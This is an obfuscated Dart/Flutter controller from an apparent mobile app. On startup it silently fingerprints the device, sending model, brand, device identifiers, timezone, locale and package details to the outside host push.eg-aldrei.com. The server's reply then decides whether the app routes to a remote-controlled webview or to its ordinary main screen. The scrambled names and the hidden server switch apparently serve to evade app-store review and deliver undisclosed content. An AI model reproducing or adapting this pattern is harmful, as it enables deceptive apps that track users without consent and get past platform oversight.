import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void cbhjvbxkbk() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/transformCoko");
  }
}

class PageLogic extends GetxController {

  var buqvozhs = RxBool(false);
  var ivwozgsj = RxBool(true);
  var hymgiud = RxString("");
  var philip = RxBool(false);
  var parker = RxBool(true);
  final jbtuvkgs = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    cbhjvbxkbk();
    super.onInit();
    mxlvjn();
  }


  Future<void> mxlvjn() async {

    philip.value = true;
    parker.value = true;
    ivwozgsj.value = false;

    jbtuvkgs.post("https://push.eg-aldrei.com/cmpvzkdnqrsxghfluytboiwa",data: await ewbhug()).then((value) {
      var pdwzex = value.data["pdwzex"] as String;
      var xegdvzy = value.data["xegdvzy"] as bool;
      if (xegdvzy) {
        hymgiud.value = pdwzex;
        jace();
      } else {
        bergnaum();
      }
    }).catchError((e) {
      ivwozgsj.value = true;
      parker.value = true;
      philip.value = false;
    });
  }

  Future<Map<String, dynamic>> ewbhug() async {
    final DeviceInfoPlugin etzorwu = DeviceInfoPlugin();
    PackageInfo iralgmwz_gdzcej = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var styka = Platform.localeName;
    var imjhb = currentTimeZone;

    var gfrjkmle = iralgmwz_gdzcej.packageName;
    var hnjfpgy = iralgmwz_gdzcej.version;
    var racbltn = iralgmwz_gdzcej.buildNumber;

    var gjqu = iralgmwz_gdzcej.appName;
    var fqxi = "";
    var pgldn  = "";
    var oqpxv = "";
    var alejandraStamm = "";
    var tateNitzsche = "";
    var jewellDooley = "";
    var jensenTowne = "";


    var wslmgje = "";
    var ampwvxl = false;

    if (GetPlatform.isAndroid) {
      wslmgje = "android";
      var vjunmhibkr = await etzorwu.androidInfo;

      oqpxv = vjunmhibkr.brand;

      fqxi  = vjunmhibkr.model;
      pgldn = vjunmhibkr.id;

      ampwvxl = vjunmhibkr.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      wslmgje = "ios";
      var avfhoye = await etzorwu.iosInfo;
      oqpxv = avfhoye.name;
      fqxi = avfhoye.model;

      pgldn = avfhoye.identifierForVendor ?? "";
      ampwvxl  = avfhoye.isPhysicalDevice;
    }
    var res = {
      "gjqu": gjqu,
      "racbltn": racbltn,
      "gfrjkmle": gfrjkmle,
      "jewellDooley" : jewellDooley,
      "fqxi": fqxi,
      "imjhb": imjhb,
      "alejandraStamm" : alejandraStamm,
      "pgldn": pgldn,
      "styka": styka,
      "wslmgje": wslmgje,
      "hnjfpgy": hnjfpgy,
      "ampwvxl": ampwvxl,
      "tateNitzsche" : tateNitzsche,
      "oqpxv": oqpxv,
      "jensenTowne" : jensenTowne,

    };
    return res;
  }

  Future<void> bergnaum() async {
    Get.offAllNamed("/transformMain");
  }

  Future<void> jace() async {
    Get.offAllNamed("/transformEdit");
  }

}
